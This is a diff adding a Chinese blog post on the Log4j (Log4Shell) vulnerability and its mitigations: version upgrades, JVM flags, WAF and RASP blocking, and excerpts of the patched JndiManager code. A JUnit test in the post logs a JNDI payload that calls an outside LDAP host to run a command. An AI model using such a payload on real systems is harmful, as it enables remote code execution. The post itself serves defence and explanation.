+<li>示例代码</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public class Log4jErrorTest &#123;</span><br><span class="line"></span><br><span class="line">    private static final Logger logger = LogManager.getLogger(Log4jErrorTest.class);</span><br><span class="line">    @Test</span><br><span class="line">    void testLog4jError() throws InterruptedException &#123;</span><br><span class="line">        // -Dlog4j2.formatMsgNoLookups=true jvm参数修复</span><br><span class="line">        final boolean[] sign = &#123;false&#125;;</span><br><span class="line">        Thread thread = new Thread(new Runnable() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void run() &#123;</span><br><span class="line">                logger.error(&quot;$&#123;jndi:ldap://192.168.1.20:1389/Basic/Command/calc&#125;&quot;);</span><br><span class="line">                sign[0] = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        thread.start();</span><br><span class="line">        try &#123;</span><br><span class="line">            Thread.sleep(500);</span><br><span class="line">        &#125; catch (Exception e)&#123;</span><br><span class="line">            Assertions.assertEquals(true, sign[0]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Assertions.assertEquals(true, sign[0]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="4-修正策略"><a href="#4-修正策略" class="headerlink" title="4.修正策略"></a>4.修正策略</h2><ul>
+<li>升级版本log版本<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">log4j_version=2.16.0</span><br><span class="line"></span><br><span class="line">log4j2.15版本未完全解决</span><br></pre></td></tr></table></figure></li>
+</ul>
+<ul>
+<li>添加jvm参数启动参数<ul>
+<li>log4j版本大于2.10才可用<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-Dlog4j2.formatMsgNoLookups=true</span><br><span class="line"></span><br><span class="line">//启动配置：log4j2.formatMsgNoLookups=True，不建议，不如升级版本</span><br><span class="line">//设置系统环境变量 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 为 true</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>其他修正 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">禁止不必要的业务访问外网这个也不建议，影响业务线程阻塞</span><br><span class="line">采用 rasp 对lookup的调用进行阻断</span><br><span class="line">采用waf对请求流量中的$&#123;jndi进行拦截</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="5-漏洞片段"><a href="#5-漏洞片段" class="headerlink" title="5.漏洞片段"></a>5.漏洞片段</h2><h3 id="5-1-漏洞堆栈"><a href="#5-1-漏洞堆栈" class="headerlink" title="5.1 漏洞堆栈"></a>5.1 漏洞堆栈</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&quot;main&quot; #1 prio=5 os_prio=31 tid=0x00007fc01e807000 nid=0x2703 runnable [0x000070000b944000]</span><br><span class="line">   java.lang.Thread.State: RUNNABLE</span><br><span class="line">	at java.net.PlainSocketImpl.socketConnect(Native Method)</span><br><span class="line">	at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:350)</span><br><span class="line">	- locked &lt;0x0000000796c8d0d0&gt; (a java.net.SocksSocketImpl)</span><br><span class="line">	at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:206)</span><br><span class="line">	at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:188)</span><br><span class="line">	at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392)</span><br><span class="line">	at java.net.Socket.connect(Socket.java:606)</span><br><span class="line">	at java.net.Socket.connect(Socket.java:555)</span><br><span class="line">	at java.net.Socket.&lt;init&gt;(Socket.java:451)</span><br><span class="line">	at java.net.Socket.&lt;init&gt;(Socket.java:228)</span><br><span class="line">	at com.sun.jndi.ldap.Connection.createSocket(Connection.java:375)</span><br><span class="line">	at com.sun.jndi.ldap.Connection.&lt;init&gt;(Connection.java:215)</span><br><span class="line">	at com.sun.jndi.ldap.LdapClient.&lt;init&gt;(LdapClient.java:137)</span><br><span class="line">	at com.sun.jndi.ldap.LdapClient.getInstance(LdapClient.java:1609)</span><br><span class="line">	at com.sun.jndi.ldap.LdapCtx.connect(LdapCtx.java:2749)</span><br><span class="line">	at com.sun.jndi.ldap.LdapCtx.&lt;init&gt;(LdapCtx.java:319)</span><br><span class="line">	at com.sun.jndi.url.ldap.ldapURLContextFactory.getUsingURLIgnoreRootDN(ldapURLContextFactory.java:60)</span><br><span class="line">	at com.sun.jndi.url.ldap.ldapURLContext.getRootURLContext(ldapURLContext.java:61)</span><br><span class="line">	at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:202)</span><br><span class="line">	at com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)</span><br><span class="line">	at javax.naming.InitialContext.lookup(InitialContext.java:417)</span><br><span class="line">	at org.apache.logging.log4j.core.net.JndiManager.lookup(JndiManager.java:172)</span><br><span class="line">	at org.apache.logging.log4j.core.lookup.JndiLookup.lookup(JndiLookup.java:56)</span><br><span class="line">	at org.apache.logging.log4j.core.lookup.Interpolator.lookup(Interpolator.java:221)</span><br><span class="line">	at org.apache.logging.log4j.core.lookup.StrSubstitutor.resolveVariable(StrSubstitutor.java:1110)</span><br><span class="line">	at org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:1033)</span><br><span class="line">	at org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:912)</span><br><span class="line">	at org.apache.logging.log4j.core.lookup.StrSubstitutor.replace(StrSubstitutor.java:467)</span><br><span class="line">	at org.apache.logging.log4j.core.pattern.MessagePatternConverter.format(MessagePatternConverter.java:132)</span><br><span class="line">	at org.apache.logging.log4j.core.pattern.PatternFormatter.format(PatternFormatter.java:38)</span><br><span class="line">	at org.apache.logging.log4j.core.layout.PatternLayout$PatternSerializer.toSerializable(PatternLayout.java:344)</span><br><span class="line">	at org.apache.logging.log4j.core.layout.PatternLayout.toText(PatternLayout.java:244)</span><br><span class="line">	at org.apache.logging.log4j.core.layout.PatternLayout.encode(PatternLayout.java:229)</span><br><span class="line">	at org.apache.logging.log4j.core.layout.PatternLayout.encode(PatternLayout.java:59)</span><br><span class="line">	at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.directEncodeEvent(AbstractOutputStreamAppender.java:197)</span><br><span class="line">	at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.tryAppend(AbstractOutputStreamAppender.java:190)</span><br><span class="line">	at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.append(AbstractOutputStreamAppender.java:181)</span><br><span class="line">	at org.apache.logging.log4j.core.config.AppenderControl.tryCallAppender(AppenderControl.java:156)</span><br><span class="line">	at org.apache.logging.log4j.core.config.AppenderControl.callAppender0(AppenderControl.java:129)</span><br><span class="line">	at org.apache.logging.log4j.core.config.AppenderControl.callAppenderPreventRecursion(AppenderControl.java:120)</span><br><span class="line">	at org.apache.logging.log4j.core.config.AppenderControl.callAppender(AppenderControl.java:84)</span><br><span class="line">	at org.apache.logging.log4j.core.config.LoggerConfig.callAppenders(LoggerConfig.java:540)</span><br><span class="line">	at org.apache.logging.log4j.core.config.LoggerConfig.processLogEvent(LoggerConfig.java:498)</span><br><span class="line">	at org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:481)</span><br><span class="line">	at org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:456)</span><br><span class="line">	at org.apache.logging.log4j.core.config.DefaultReliabilityStrategy.log(DefaultReliabilityStrategy.java:63)</span><br><span class="line">	at org.apache.logging.log4j.core.Logger.log(Logger.java:161)</span><br><span class="line">	at org.apache.logging.log4j.spi.AbstractLogger.tryLogMessage(AbstractLogger.java:2205)</span><br><span class="line">	at org.apache.logging.log4j.spi.AbstractLogger.logMessageTrackRecursion(AbstractLogger.java:2159)</span><br><span class="line">	at org.apache.logging.log4j.spi.AbstractLogger.logMessageSafely(AbstractLogger.java:2142)</span><br><span class="line">	at org.apache.logging.log4j.spi.AbstractLogger.logMessage(AbstractLogger.java:2017)</span><br><span class="line">	at org.apache.logging.log4j.spi.AbstractLogger.logIfEnabled(AbstractLogger.java:1983)</span><br><span class="line">	at org.apache.logging.log4j.spi.AbstractLogger.error(AbstractLogger.java:740)</span><br><span class="line">	at log4jRCE.main(log4jRCE.java:16)</span><br></pre></td></tr></table></figure>
+<h3 id="5-2-修正策略"><a href="#5-2-修正策略" class="headerlink" title="5.2 修正策略"></a>5.2 修正策略</h3><ul>
+<li>以2.16.0为例<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//jndi关闭策略</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isJndiEnabled</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> PropertiesUtil.getProperties().getBooleanProperty(<span class="string">&quot;log4j2.enableJndi&quot;</span>, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭策略</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> JndiManager <span class="title">createManager</span><span class="params">(<span class="keyword">final</span> String name, <span class="keyword">final</span> Properties data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (isJndiEnabled()) &#123;  <span class="comment">// 2021/12/13 修正</span></span><br><span class="line">        String hosts = data != <span class="keyword">null</span> ? data.getProperty(ALLOWED_HOSTS) : <span class="keyword">null</span>;</span><br><span class="line">        String classes = data != <span class="keyword">null</span> ? data.getProperty(ALLOWED_CLASSES) : <span class="keyword">null</span>;</span><br><span class="line">        String protocols = data != <span class="keyword">null</span> ? data.getProperty(ALLOWED_PROTOCOLS) : <span class="keyword">null</span>;</span><br><span class="line">        List&lt;String&gt; allowedHosts = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        List&lt;String&gt; allowedClasses = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        List&lt;String&gt; allowedProtocols = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        addAll(hosts, allowedHosts, permanentAllowedHosts, ALLOWED_HOSTS, data);</span><br><span class="line">        addAll(classes, allowedClasses, permanentAllowedClasses, ALLOWED_CLASSES, data);</span><br><span class="line">        addAll(protocols, allowedProtocols, permanentAllowedProtocols, ALLOWED_PROTOCOLS, data);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> JndiManager(name, <span class="keyword">new</span> InitialDirContext(data), allowedHosts, allowedClasses,</span><br><span class="line">                                   allowedProtocols);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> NamingException e) &#123;</span><br><span class="line">            LOGGER.error(<span class="string">&quot;Error creating JNDI InitialContext.&quot;</span>, e);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> JndiManager(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> &lt;T&gt; <span class="function">T <span class="title">lookup</span><span class="params">(<span class="keyword">final</span> String name)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (context == <span class="keyword">null</span>) &#123;  <span class="comment">//2021/12/12 修正</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        URI uri = <span class="keyword">new</span> URI(name);</span><br><span class="line">        ...</span><br><span class="line">    &#125; <span class="keyword">catch</span> (URISyntaxException ex) &#123;</span><br><span class="line">        LOGGER.warn(<span class="string">&quot;Invalid JNDI URI - &#123;&#125;&quot;</span>, name);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2021/12/12</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">JndiManager</span><span class="params">(<span class="keyword">final</span> String name)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(<span class="keyword">null</span>, name);</span><br><span class="line">    <span class="keyword">this</span>.context = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">this</span>.allowedProtocols = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">this</span>.allowedClasses = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">this</span>.allowedHosts = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2021/12/12 修正</span></span><br><span class="line"><span class="keyword">if</span> (JndiManager.isJndiEnabled()) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> JmsManager(name, data);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> Exception e) &#123;</span><br><span class="line">        logger().error(<span class="string">&quot;Error creating JmsManager using JmsManagerConfiguration [&#123;&#125;]&quot;</span>, data, e);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    logger().error(<span class="string">&quot;JNDI has not been enabled. The log4j2.enableJndi property must be set to true&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">final</span> Map.Entry&lt;String, PluginType&lt;?&gt;&gt; entry : plugins.entrySet()) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> Class&lt;? extends StrLookup&gt; clazz = entry.getValue().getPluginClass().asSubclass(StrLookup.class);</span><br><span class="line"><span class="comment">//2021/12/13 修正</span></span><br><span class="line">        <span class="keyword">if</span> (!clazz.getName().equals(JndiLookup.class.getName()) || JndiManager.isJndiEnabled()) &#123;</span><br><span class="line">            strLookupMap.put(entry.getKey().toLowerCase(), ReflectionUtil.instantiate(clazz));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> Throwable t) &#123;</span><br><span class="line">        handleError(entry.getKey(), t);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2021/12/05</span></span><br><span class="line">修正MessagePatternConverter</span><br><span class="line">此版本主要为<span class="number">2.15</span>版本修正内容</span><br></pre></td></tr></table></figure>
+<h2 id="6-参考"><a href="#6-参考" class="headerlink" title="6.参考"></a>6.参考</h2><a target="_blank" rel="noopener" href="https://www.oschina.net/news/174145/all-response-to-log4shell">https://www.oschina.net/news/174145/all-response-to-log4shell</a></li>
+</ul>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="https://wuhaocn.github.io/2021/12/17/language/java/log4j/log4j%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D%E5%8F%8A%E9%98%B2%E6%8A%A4/" title="log4j漏洞介绍及防护" target="_blank" rel="external">https://wuhaocn.github.io/2021/12/17/language/java/log4j/log4j漏洞介绍及防护/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/wuhaocn" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.png" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/wuhaocn" target="_blank"><span class="text-dark">wuhaocn</span><small class="ml-1x">Java &amp; 后端 &amp; 通信</small></a></h3>
+        <div>个人简介。</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    
+    <li class="next">
+      <a href="/2021/12/03/network/akka/Akka-SLF4J%E6%89%93%E5%8D%B0%E6%97%A5%E5%BF%97/" title="Akka-SLF4J打印日志"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/wuhaocn" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com/cofess" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/iwebued" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/cofess" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/wuhaocn" target="_blank"> cofess </a>base on <a href="https://github.com/wuhaocn/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: 'UWmpsjuNfPNkkicYrPtMzVQC-gzGzoHsz',
+    appKey: '825aG0XPHawp6VAXnYsrnlp3',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
